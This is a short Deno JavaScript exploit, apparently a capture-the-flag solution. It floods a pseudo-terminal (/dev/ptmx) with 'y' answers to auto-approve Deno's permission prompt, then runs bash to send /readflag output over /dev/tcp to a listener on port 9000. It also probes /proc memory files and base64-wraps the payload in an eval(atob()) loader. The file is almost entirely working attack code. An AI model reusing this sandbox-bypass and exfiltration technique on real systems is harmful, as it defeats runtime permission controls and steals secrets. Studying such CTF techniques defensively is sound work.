// for(let j=0;j<100;j++){
// 	for(let i=0;i<100;i++){
// 		try{
// 			await Deno.open("/proc/"+j+"/task/"+i+"/mem", { read: true, write: true });
// 			console.log(2)
// 		}catch(e){

// 		}
// 	}
// }
async function sol(){
	const file = await Deno.open("/dev/ptmx", { read: true, write: true });
	await Deno.open("/dev/ptmx", { read: true, write: true });
	await Deno.open("/dev/ptmx", { read: true, write: true });
	await Deno.open("/dev/ptmx", { read: true, write: true });
	await Deno.open("/dev/ptmx", { read: true, write: true });

	let j = file.write(new Uint8Array("y\n".repeat(4000).split("").map(e=>e.codePointAt(0))))
	await Deno.permissions.request({name:'run'});
	let v = Deno.run({ cmd:["bash","-c","/readflag > /dev/tcp/0.0.0.0/9000"],stdout:'null',stderr:'null',stdin:'null'});
	setTimeout(1,1000)
}

console.log(btoa(`
if(!window.aa){
	window.aa = 1337;
	eval(atob(Deno.args[0]))
}
`+'/'.repeat(100)+'\n'+sol.toString()+';sol()'))
